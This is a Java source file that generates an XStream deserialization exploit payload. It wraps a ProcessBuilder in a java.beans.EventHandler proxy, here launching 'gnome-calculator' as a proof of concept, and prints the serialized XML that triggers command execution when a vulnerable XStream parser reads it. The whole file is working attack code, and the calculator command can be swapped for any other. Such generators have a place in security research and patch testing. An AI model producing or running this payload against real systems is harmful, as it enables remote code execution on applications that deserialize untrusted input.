import com.thoughtworks.xstream.XStream;

import java.beans.EventHandler;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;

public class SimplePayloadGenerator {

    public static void main(String[] args) throws ClassNotFoundException {
        ProcessBuilder pb = new ProcessBuilder("gnome-calculator");

        InvocationHandler handler = new EventHandler(pb, "start", null, null);

        IDummyInterface proxy = (IDummyInterface) Proxy.newProxyInstance(SimplePayloadGenerator.class.getClassLoader(), new Class[] { IDummyInterface.class }, handler);

        System.out.println(new XStream().toXML(proxy));
    }

}
